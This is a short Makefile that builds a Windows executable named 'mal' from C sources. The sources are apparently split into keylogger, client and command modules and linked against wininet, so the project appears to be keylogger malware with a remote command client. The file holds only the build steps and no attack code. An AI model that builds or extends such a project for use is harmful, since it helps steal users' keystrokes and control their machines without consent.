
CC = gcc # Compiler

CFLAGS = -Wall # -m32 # compiler flags

TARGET = mal # output executable name

# source files
SRCS = \
	src\main.c\
	\
	src\program\program.c\
	src\program\utils.c\
	\
	src\keylogger\keylogger.c\
	src\keylogger\keypair.c\
	\
	src\client\client.c\
	src\client\commands.c

# build target
$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) -o $(TARGET) $(SRCS) -lwininet

clean:
	del .\$(TARGET).exe

	